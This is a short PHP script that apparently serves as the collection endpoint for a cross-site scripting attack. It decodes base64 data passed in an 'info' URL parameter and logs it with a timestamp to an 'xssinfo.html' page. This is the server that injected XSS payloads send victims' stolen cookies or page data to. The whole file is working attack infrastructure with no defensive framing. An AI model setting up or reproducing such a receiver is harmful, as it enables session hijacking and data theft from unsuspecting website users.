<?php
    @header("Content-Type:text/html;charset=utf-8");

    if(!empty($_GET['info']))
    {   
        $current_time = date("Y-m-d H:i:s");
        $info = urldecode(base64_decode($_GET['info']));
        if(!file_exists('xssinfo.html'))
        {
            file_put_contents('xssinfo.html','<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>xss info</title><style>body{font-size:16px;}</style></head>');
        }
        file_put_contents('xssinfo.html',"".$current_time."<br/>"."Info: <br/>".htmlspecialchars($info,ENT_QUOTES)."<br/><br/><br/><br/>",FILE_APPEND);
        
    }